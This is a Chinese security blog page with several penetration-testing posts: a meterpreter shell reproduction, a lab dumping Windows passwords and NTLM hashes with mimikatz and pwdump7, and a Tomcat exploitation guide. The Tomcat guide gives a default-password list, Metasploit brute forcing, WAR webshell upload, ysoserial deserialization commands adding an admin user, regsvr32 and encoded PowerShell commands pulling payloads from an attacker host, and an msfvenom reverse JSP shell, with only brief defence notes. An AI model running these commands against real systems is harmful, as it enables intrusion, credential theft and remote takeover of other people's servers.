<p>在IE浏览器上输入。kali攻击机IP地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.11   [kali攻击机IP地址]</span><br></pre></td></tr></table></figure>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180728/1Dijdmkmdb.png?imageslim" alt="mark"></p>
<h3 id="第三步-后渗透阶段"><a href="#第三步-后渗透阶段" class="headerlink" title="第三步 后渗透阶段"></a>第三步 后渗透阶段</h3><p>靶机在输入kali攻击机IP地址后，在kali攻击机中的msf可以看到。成功反弹靶机shell。</p>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180728/eb1eAiIf0i.png?imageslim" alt="mark"></p>
<p>得到meterpreter，输入sysinfo看到靶机的系统信息。可进一步的渗透。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180728/Ekk6ElEma1.png?imageslim" alt="mark"></p>

      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-口令暴破解实验"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2018/02/16/口令暴破解实验/">口令暴力破解实验</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2018/02/16/口令暴破解实验/" class="article-date">
	  <time datetime="2018-02-16T09:52:08.000Z" itemprop="datePublished">2018-02-16</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>#口令暴力破解实验  </p>
<h2 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h2><p>&emsp;&emsp;     早期SMB协议在网络上传输明文口令。后来出现”LAN Manager Challenge/Response”验证机制，简称LM，它是如此简单以至很容易被破解。微软提出了WindowsNT挑战/响应验证机制，称之为<strong>NTLM</strong>。现在已经有了更新的NTLMv2以及Kerberos验证体系。Windows加密过的密码口令，我们称之为<strong>hash</strong>（中文：哈希），Windows的系统密码hash默认情况下一般由两部分组成：第一部分是LM-hash，第二部分是NTLM-hash。在Windows中使用安全帐户管理器 (SAM) 数据库中或 Active Directory 数据库中存储用户记录。每个密码被加密并存储在 SAM 数据库中或在 Active Directory 数据库。 </p>
<p><strong>Windows系统下的hash密码格式为：用户名称:RID:LM-HASH值:NT-HASH值</strong></p>
<p>例如：  用户名称为：Administrator</p>
<p>Administrator:500:C8825DB10F2590EAAAD3B435B51404EE:683020925C5D8569C23AA724774CE6CC:::</p>
<p>​    表示R为：</p>
<p>​    ID为：500</p>
<p>​    LM-HASH值为：C8825DB10F2590EAAAD3B435B51404EE<br>​    NT-HASH值为：683020925C5D8569C23AA724774CE6CC </p>
<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="1、使用-mimikatz-获取明文密码"><a href="#1、使用-mimikatz-获取明文密码" class="headerlink" title="1、使用 mimikatz 获取明文密码"></a>1、使用 mimikatz 获取明文密码</h3><p>​    mimikatz是一款功能强大的轻量级调试神器，提升进程权限注入进程读取进程内存，使用 mimikatz 获取明文密码。</p>
<p>首先用管理员身份打开命令终端窗口cmd。</p>
<p>&emsp;&emsp;使用 mimikatz 获取明文密码，用管理员身份打开命令终端窗口cmd。</p>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180726/98dcfjKm8h.png?imageslim" alt="mark"></p>
<p>点击确定</p>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180726/AhE26DIjKL.png?imageslim" alt="mark"></p>
<p>复制目录文件，到桌面下mimikatz_trunk目录下的Win32目录下并执行mimikatz命令。</p>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180726/gH1A7ge6mm.png?imageslim" alt="mark"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd C:\Users\college\Desktop\mimikatz_trunk\Win32</span><br><span class="line">mimikatz</span><br></pre></td></tr></table></figure>
<p>执行mimikatz命令后可看到进入mimikatz软件交互界面。</p>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180726/89JG2djG92.png?imageslim" alt="mark"></p>
<p>进入mimikatz软件交互界面后执行以下命令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180726/DHc1fJI62K.png?imageslim" alt="mark"></p>
<p>如图所示得到明文密码，另SHA1密码可在线破解</p>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180726/gb1Ba8L4J4.png?imageslim" alt="mark"></p>
<h3 id="2、使用-pwdump7-获取密码NTLM-hash"><a href="#2、使用-pwdump7-获取密码NTLM-hash" class="headerlink" title="2、使用 pwdump7 获取密码NTLM hash"></a>2、使用 pwdump7 获取密码NTLM hash</h3><p>NTLM hash是指Windows系统下Security Account Manager中保存的用户密码hash</p>
<p>该NTLM hash的生成方法：</p>
<ol>
<li><p>将明文口令转换成十六进制的格式</p>
</li>
<li><p>转换成Unicode格式，即在每个字节之后添加0x00</p>
</li>
<li><p>对Unicode字符串作MD4加密，生成32位的十六进制数字串</p>
</li>
</ol>
<p>同上一个实验，进入管理员cmd，进入pwdump7 目录，执行以下命令，可得到本地NTLM hash。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">cd C:\Users\college\Desktop\pwdump7</span><br><span class="line"></span><br><span class="line">pwdump7</span><br></pre></td></tr></table></figure></p>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180726/8bH8Ca0h0d.png?imageslim" alt="mark"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:NO PASSWORD*********************:31D6CFE0D16AE931B73C59D7E0C089C0:::</span><br><span class="line">Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::</span><br><span class="line">college:1000:NO PASSWORD*********************:7C70A81C7C5882C24298D391FD397885:::</span><br><span class="line">user:1001:NO PASSWORD*********************:57D583AA46D571502AAD4BB7AEA09C70:::</span><br></pre></td></tr></table></figure>
<p>可在线破解NTLM 密码</p>
<p><a href="http://www.cmd5.com/" target="_blank" rel="noopener">http://www.cmd5.com/</a></p>
<p><img src="http://wfwewefw.yuxuni.cn/blog/180726/76C0ak8f29.png?imageslim" alt="mark"></p>
<h2 id="思考与总结"><a href="#思考与总结" class="headerlink" title="思考与总结"></a>思考与总结</h2><p>&emsp;&emsp;通过本次实验，成功实现了Windows 下密码的抓取与剖解，了解windows系统密码Hash 相关知识。</p>

      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/口令/">口令</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-中间件安全-Tomcat 系列漏洞利用与安全加固"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2018/02/03/中间件安全-Tomcat 系列漏洞利用与安全加固/">Tomcat 系列漏洞利用与安全加固</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2018/02/03/中间件安全-Tomcat 系列漏洞利用与安全加固/" class="article-date">
	  <time datetime="2018-02-03T15:53:56.000Z" itemprop="datePublished">2018-02-03</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Tomcat-系列漏洞利用与安全加固"><a href="#Tomcat-系列漏洞利用与安全加固" class="headerlink" title="Tomcat 系列漏洞利用与安全加固"></a>Tomcat 系列漏洞利用与安全加固</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>​    Tomcat 是由 Apache 开发的一个 Servlet 容器，实现了对 Servlet 和 JSP 的支持，并提供了作为Web服务器的一些特有功能，如Tomcat管理和控制平台、安全域管理和Tomcat阀等。</p>
<p>​    由于 Tomcat 本身也内含了一个 HTTP 服务器，它也可以被视作一个单独的 Web 服务器。但是，不能将 Tomcat 和 Apache HTTP 服务器混淆，Apache HTTP 服务器是一个用 C 语言实现的 HTTP Web 服务器；这两个 HTTP web server 不是捆绑在一起的。Tomcat 包含了一个配置管理工具，也可以通过编辑XML格式的配置文件来进行配置。</p>
<h3 id="Tomcat-重要目录"><a href="#Tomcat-重要目录" class="headerlink" title="Tomcat 重要目录"></a>Tomcat 重要目录</h3><ul>
<li><strong>/bin</strong> - Tomcat 脚本存放目录（如启动、关闭脚本）。 <code>*.sh</code> 文件用于 Unix 系统； <code>*.bat</code> 文件用于 Windows 系统。</li>
<li><strong>/conf</strong> - Tomcat 配置文件目录。</li>
<li><strong>/logs</strong> - Tomcat 默认日志目录。</li>
<li><strong>/webapps</strong> - webapp 运行的目录。</li>
</ul>
<h3 id="web-工程发布目录结构"><a href="#web-工程发布目录结构" class="headerlink" title="web 工程发布目录结构"></a>web 工程发布目录结构</h3><p>一般 web 项目路径结构</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">|-- webapp                         # 站点根目录</span><br><span class="line">    |-- META-INF                   # META-INF 目录</span><br><span class="line">    |   `-- MANIFEST.MF            # 配置清单文件</span><br><span class="line">    |-- WEB-INF                    # WEB-INF 目录</span><br><span class="line">    |   |-- classes                # class文件目录</span><br><span class="line">    |   |   |-- *.class            # 程序需要的 class 文件</span><br><span class="line">    |   |   `-- *.xml              # 程序需要的 xml 文件</span><br><span class="line">    |   |-- lib                    # 库文件夹</span><br><span class="line">    |   |   `-- *.jar              # 程序需要的 jar 包</span><br><span class="line">    |   `-- web.xml                # Web应用程序的部署描述文件</span><br><span class="line">    |-- &lt;userdir&gt;                  # 自定义的目录</span><br><span class="line">    |-- &lt;userfiles&gt;                # 自定义的资源文件</span><br></pre></td></tr></table></figure>
<p><code>webapp</code>：工程发布文件夹。其实每个 war 包都可以视为 webapp 的压缩包。</p>
<p><code>META-INF</code>：META-INF 目录用于存放工程自身相关的一些信息，元文件信息，通常由开发工具，环境自动生成。</p>
<p><code>WEB-INF</code>：Java web应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。</p>
<p><code>/WEB-INF/classes</code>：存放程序所需要的所有 Java class 文件。</p>
<p><code>/WEB-INF/lib</code>：存放程序所需要的所有 jar 文件。</p>
<p><code>/WEB-INF/web.xml</code>：web 应用的部署配置文件。它是工程中最重要的配置文件，它描述了 servlet 和组成应用的其它组件，以及应用初始化参数、安全管理约束等。</p>
<h2 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h2><h3 id="1-发现目标的-tomcat-管理控制台入口"><a href="#1-发现目标的-tomcat-管理控制台入口" class="headerlink" title="1.    发现目标的 tomcat 管理控制台入口"></a>1.    发现目标的 tomcat 管理控制台入口</h3><p>第一种,通过常规端口扫描,获取服务 banner    </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># nmap -n -sT -Pn --open -v -p 8080-8090,8443 -sV 192.168.3.100-200	tomcat 的默认端口通常情况下都会在这个区间内,至于具体用什么扫无所谓,masscan,zmap 都一样,只不过 nmap 会识别的更精准</span><br></pre></td></tr></table></figure>
<p>第二种,通过各类外部 web 搜索引擎进行批量抓取</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Googele dorks:</span><br><span class="line">nurl:/manager/html intitle:apache tomcat site:*.target.*	通 常 ,Tomcat 控 制 台 的 默 认 路 径 都 为 /manager/html </span><br><span class="line">intext:$CATALINA_HOME/webapps/ROOT/ intitle:Apache Tomcat site:*.target.*	在低版本的 tomcat 欢迎页中还会写有 CATALINA 的路径,可把此作为关键字来精确搜索intext:$CATALINA_HOME/webapps/ROOT/ intitle:Apache Tomcat/6.0.24 site:*.target.*	可以只找特定版本的 tomcat,比如,爆出专门针对某个特定版本 tomcat 的漏洞</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Bing dorks:</span><br><span class="line">intitle:&quot;apache tomcat&quot; site:target.com	搜集特定目标的所有 tomcat 入口,个人觉得 bing 有时候比 google 更精准</span><br></pre></td></tr></table></figure>
<p>第三种,通过各类空间搜索引擎进行批量抓取 [ 此处暂以 shodan 为例, zoomeye,fofa,censys…其实都差不多,不差钱的情况下,个人还是更建议直接用 shodan,毕竟它没有处理过搜索结果,脚本配合 api 批量抓会很方便 ]</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net:&quot;40.112.0.0/16&quot; port:&quot;8080&quot; product:&quot;Apache Tomcat/Coyote JSP engine&quot;	对某些大目标来讲,可先尝试获取它的 as 号,然后再根据 as 号查到的网段,批量抓 tomcat 入口</span><br></pre></td></tr></table></figure>
<h3 id="2-低版本-tomcat-管理控制台的弱口令爆破"><a href="#2-低版本-tomcat-管理控制台的弱口令爆破" class="headerlink" title="2.    低版本 tomcat 管理控制台的弱口令爆破"></a>2.    低版本 tomcat 管理控制台的弱口令爆破</h3><p> 此处暂以 tomcat 6.0.9 为例进行演示 </p>
<p>注意,此处所说的低版本 tomcat,通常是指 7.x 以下的版本,不包括 7.x,因为在 7.x 之后的版本中开始加入了防爆机制,会自动锁定正在爆破的用户,所以如果你在实战中看到 tomcat 7.x 以后的版本,基本都不用再尝试爆破了,也几乎不太可能爆出来,ok,说完利用前提,我们就来实际的干,首先,去添加好 tomcat 控制台角色用户,到 C:\apache-tomcat-6.0.9\conf\tomcat-users.xml 文件的<tomcat-users>标签内添加如下用户,注意,6.x 的角色名称可能不大一样,在角色后面没有-gui,7.x 版本之后的才有,配置完之后,运行 C:\apache-tomcat-6.0.9\bin\startup.bat 脚本即可启动 tomcat 服务</tomcat-users></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">role rolename="manager"/&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">"admin"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span> <span class="attr">username</span>=<span class="string">"tomcat"</span> <span class="attr">password</span>=<span class="string">"tomcat"</span> <span class="attr">roles</span>=<span class="string">"manager,admin"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>爆破 msf 中的 tomcat_mgr_login 模块</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/http/tomcat_mgr_login</span><br><span class="line">msf &gt; set rhosts 192.168.3.188 msf &gt; set rport 8080</span><br><span class="line">msf &gt; set targeturi /manager/html msf &gt; set username tomcat</span><br><span class="line">msf &gt; set pass_file /root/wordlist/passwd.txt</span><br><span class="line">msf &gt; set stop_on_success true msf &gt; set bruteforce_speed 2</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>
<p>常见的 Tomcat 管理控制台弱口令:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">admin:password</span><br><span class="line">admin:Password1 </span><br><span class="line">admin:password1</span><br><span class="line">admin:admin</span><br><span class="line">admin:123456 </span><br><span class="line">admin:a123456</span><br><span class="line">admin:12345678</span><br><span class="line">admin:j5Brn9 </span><br><span class="line">admin:tomcat</span><br><span class="line">tomcat:tomcat </span><br><span class="line">tomcat:s3cret </span><br><span class="line">tomcat:password1 </span><br><span class="line">tomcat:password</span><br><span class="line">tomcat:admin</span><br><span class="line">tomcat:changethis</span><br><span class="line">both:tomcat </span><br><span class="line">manager:manager </span><br><span class="line">role1:role1 </span><br><span class="line">role1:tomcat </span><br><span class="line">role:changethis </span><br><span class="line">root:Password1</span><br><span class="line">root:changethis </span><br><span class="line">root:password </span><br><span class="line">root:password1</span><br><span class="line">root:r00t </span><br><span class="line">root:toor </span><br><span class="line">root:root</span><br><span class="line">admin:</span><br><span class="line">tomcat:</span><br></pre></td></tr></table></figure>
<h3 id="3-war包部署webshell"><a href="#3-war包部署webshell" class="headerlink" title="3.    war包部署webshell"></a>3.    war包部署webshell</h3><p>​    在 tomcat 的 manager 中控制台自带的自动 war 包部署功能来部署我们的 webshell</p>
<p>把当前目录下的xiaoma.jsp文件打包成xiaoma.war</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jar -cvfM0 xiaoma.war xiaoma.jsp</span><br><span class="line"></span><br><span class="line">-c 创建war包</span><br><span class="line">-v 显示过程信息</span><br><span class="line">-f</span><br><span class="line">-M</span><br><span class="line">-0 这个是阿拉伯数字，只打包不压缩的意思</span><br></pre></td></tr></table></figure>
<p>防御：</p>
<ul>
<li>直接删掉 manager 目录</li>
<li>加强web口令</li>
<li>安全设备</li>
</ul>
<p>[Java类WebServer及中间件拿webshell方法总结]</p>
<p>具体参见：<a href="https://www.cnblogs.com/shellr00t/p/5965727.html" target="_blank" rel="noopener">https://www.cnblogs.com/shellr00t/p/5965727.html</a></p>
<h3 id="4-Tomacat-远程代码执行-CVE-2016-8735"><a href="#4-Tomacat-远程代码执行-CVE-2016-8735" class="headerlink" title="4.    Tomacat 远程代码执行[CVE-2016-8735 ]"></a>4.    Tomacat 远程代码执行[CVE-2016-8735 ]</h3><p>mark：<a href="http://www.freebuf.com/news/121868.html" target="_blank" rel="noopener">http://www.freebuf.com/news/121868.html</a></p>
<h4 id="前提是要启用JmxRemoteLifecycleListener包，默认情况下是不启用的"><a href="#前提是要启用JmxRemoteLifecycleListener包，默认情况下是不启用的" class="headerlink" title="前提是要启用JmxRemoteLifecycleListener包，默认情况下是不启用的"></a><strong>前提是要启用JmxRemoteLifecycleListener包，默认情况下是不启用的</strong></h4><h5 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><h5 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h5><blockquote>
<p>Apache Tomcat 9.0.0.M1 to 9.0.0.M11</p>
<p>Apache Tomcat 8.5.0 to 8.5.6</p>
<p>Apache Tomcat 8.0.0.RC1 to 8.0.38</p>
<p>Apache Tomcat 7.0.0 to 7.0.72</p>
<p>Apache Tomcat 6.0.0 to 6.0.47</p>
</blockquote>
<p>在 Tomcat 中默认会使用 JmxRemoteLifecycleListener 这个监听器来监控 tomcat 平时的各种运行状态,但 Oracle 在修复了 JmxRemoteLifecycleListener 反序列化漏洞[CVE-2016-3427] 之后,却忘记了及时对 Tomcat<br>中的 jmx 监听器进行升级,这才导致了该漏洞的产生,所以,它本质还是 jmx 的漏洞并非 tomcat 自身漏洞,实际上 JmxRemoteLifecycleListener 平时用来做监控居多,没错,实战中直接从外部碰到该端口的机会也并不是特别多。</p>
<h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用:"></a>漏洞利用:</h5><p>首先,依然是先准备好基础环境,配置 JmxRemoteLifecycleListener 监听器,注意,如果你发现自己 tomcat 的lib 目录中没有 catalina-jmx-remote.jar 这个包,请自行到官方站点下载好放进去,不然可能会出报错,不过一般默认都会有,而后编辑 C:\apache-tomcat-8.0.36\conf\server.xml 添加如下的监听器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Listener className=&quot;org.apache.catalina.mbeans.JmxRemoteLifecycleListener&quot; rmiRegistryPortPlatform=&quot;10001&quot; rmiServerPortPlatform=&quot;10002&quot; /&gt;</span><br></pre></td></tr></table></figure>
<p>端口可随意,只要不冲突即可</p>
<p>之后,再去编辑 C:\apache-tomcat-8.0.36\bin\catalina.bat 文件,添加如下变量,直接在 setlocal 下面开始添加,语句的主要作用是方便别人远程连过来对此 jvm 进行监控,注意,此处是没有启用用户认证</p>
<p>最后,执行 C:\apache-tomcat-8.0.36\bin\startup.bat 脚本,启动 tomcat,看到 rmi 的端口全部正常起来以后,说明环境基本就没啥问题了</p>
<p><strong>扫描：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -n -sT -sV -p 1-50000 --open -Pn -v  [目标ip]</span><br></pre></td></tr></table></figure>
<p><strong>反序列化 payload：</strong> </p>
<p>ysoserial java 反序列化 payload 工具去执行系统命令:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit [目标ip] 1000 1 Groovy1 "cmd.exe /c net user flag "Admin!@#45" /add"</span><br></pre></td></tr></table></figure>
<p><strong>msf ：</strong></p>
<p>很显然,在实战中,如果直接像上面这样执行系统命令利用起来肯定不够直接,我们现在不妨尝试直接配合 msf 一起利用,来尝试弹回一个 meterpreter 的 shell,具体过程如下</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/script/web_delivery</span><br><span class="line">msf5 &gt; set target 3  			# regsvr32 来远程下载执行</span><br><span class="line">msf5 &gt; set payload windows/meterpreter/reverse_tcp_rc4_dns msf5 &gt; set lhost [本地ip]</span><br><span class="line">msf5 &gt; set lport 53</span><br><span class="line">msf5 &gt; set rc4password klionsec msf5 &gt; exploit -j</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">唯一需要注意的是,由于执行过程中需要远程下载 payload,所以这就要求当前目标机器必须能正常通外网才行,不然 payload 都下不了,meterpreter 自然也就弹不回来了</span><br><span class="line"></span><br><span class="line"># java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 192.168.3.188 10001 Groovy1 &quot;cmd.exe /c regsvr32 /s /n /u /i:http://192 .168.3.7:8080/CzVtq564v1ymsYr.sct scrobj.dll&quot;</span><br></pre></td></tr></table></figure>
<p><strong>powershell 回弹beacon：</strong></p>
<p>如果你觉得 meterpreter 还不够直接,没问题,直接尝试利用 powershell 尝试弹个 beacon 的 shell 也是可以的,实际利用过程如下,先生成 ps 的 payload</p>
<p>而后,继续通过 ysoserial.jar 发送执行该 payload</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar	ysoserial.exploit.RMIRegistryExploit [目标ip] 10001 Groovy1 " cmd.exe /c powershell.exe -nop -w hidden -encodedcommand base64encode"</span><br></pre></td></tr></table></figure>
<h3 id="5-Tomcat-7-0-0-x-put-方法的利用-CVE-2017-12615"><a href="#5-Tomcat-7-0-0-x-put-方法的利用-CVE-2017-12615" class="headerlink" title="5.    Tomcat 7.0.0.x put 方法的利用 [CVE-2017-12615]"></a>5.    Tomcat 7.0.0.x put 方法的利用 [CVE-2017-12615]</h3><p>mark:    <a href="https://paper.seebug.org/398/" target="_blank" rel="noopener">https://paper.seebug.org/398/</a></p>
<h4 id="前提是启动PUT方法、默认关闭。"><a href="#前提是启动PUT方法、默认关闭。" class="headerlink" title="前提是启动PUT方法、默认关闭。"></a>前提是启动PUT方法、默认关闭。</h4><p>​     在配置文件conf/web.xml 文件。默认 readonly 为 true，当 readonly 设置为 false 时，可以通过 PUT / DELETE 进行文件操控。</p>
<p><strong>用 msf 生成 jsp webshell</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=[目标IP] LPORT=80 -f raw -o rev.jsp</span><br></pre></td></tr></table></figure>
<p>通过 curl 把我们上面的 webshell 用重定向的方式直接 put 到目标机器的 web 根目录下,需要注意的是,默认 Tomcat 的 Servlet 是在 conf/web.xml 中配置的,当后缀名为 .jsp 和 .jspx 的时候,就会丢给JspServlet 处理,所以,我们需要对后缀做些特殊的处理,比如,在 url 最后加个 / . 或者 %20</p>
<p>继续通过 curl 访问执行该 webshell,即可看到目标机器的 cmd shell 被成功弹回<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I http://[目标IP]:8080/Readmes.jsp</span><br></pre></td></tr></table></figure></p>
<h3 id="7-Tomcat-本地提权漏洞利用-CVE-2016-1240"><a href="#7-Tomcat-本地提权漏洞利用-CVE-2016-1240" class="headerlink" title="7.    Tomcat 本地提权漏洞利用[CVE-2016-1240]"></a>7.    Tomcat 本地提权漏洞利用[CVE-2016-1240]</h3><p>mark：<a href="http://www.freebuf.com/vuls/115862.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/115862.html</a></p>
<blockquote>
<p>Tomcat 8 &lt;= 8.0.36-2</p>
<p>Tomcat 7 &lt;= 7.0.70-2</p>
<p>Tomcat 6 &lt;= 6.0.45 + dfsg-1~deb8u1</p>
<p>受影响的系统包括的Debian，Ubuntu的，其他使用相应的deb包的系统也可能受到影响。</p>
</blockquote>
<h4 id="前提：Debian-或者-Ubuntu-的特定-tomcat-deb-包-必须未升级"><a href="#前提：Debian-或者-Ubuntu-的特定-tomcat-deb-包-必须未升级" class="headerlink" title="前提：Debian 或者 Ubuntu 的特定 tomcat deb 包[必须未升级],"></a>前提：Debian 或者 Ubuntu 的特定 tomcat deb 包[必须未升级],</h4><p>简单回顾:</p>
<p><strong>原理：劫持服务端配置文件</strong></p>
<p>核心就在于 Tomcat 服务在启动时 [关键代码如下] 会将 log 文件 catalina.out 的所有者改为 Tomcat 用户[降权行为],而启动脚本通常却是以 root 权限在执行,那么借助此特性,我们可以通过用创建软链接的方式,在<br>root 重启 tomcat 服务时将任意文件的属主改为 Tomcat 账户,以达到降权访问系统核心配置文件的目的,比如,你事先在 tomcat 权限下将 catalina.out 修改为指向那些原本需要高权限才能访问到的关键性系统文件的软链接,此后 root 重启 tomat 便可以随意访问该系统配置文件,说到底这其实还是一种非常典型的配置文件加载劫持手法,更深入的就不说了,主要还是看在实战中如何利用,漏洞关键代码如下,就那一句</p>
<p>默认网站目录位置:<br>/var/lib/tomcat7/webapps/ROOT</p>
<p>添加控制台角色用户,等会儿部署 webshell 要用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># vi /etc/tomcat7/tomcat-users.xml</span><br><span class="line">&lt;role rolename=&quot;manager-gui&quot;/&gt;</span><br><span class="line">&lt;role rolename=&quot;admin-gui&quot;/&gt;</span><br><span class="line">&lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager -gui,admin-gui&quot;/&gt;</span><br><span class="line"># /etc/init.d/tomcat7 restart	重启 tomcat 服务</span><br></pre></td></tr></table></figure>
<p>下面,我们来着重看看具体利用过程,先尝试通过部署 war 包弹回一个低权限的 meterpreter 的 shell</p>
<p>用 msf 快速生成一个 war 包 webshell</p>
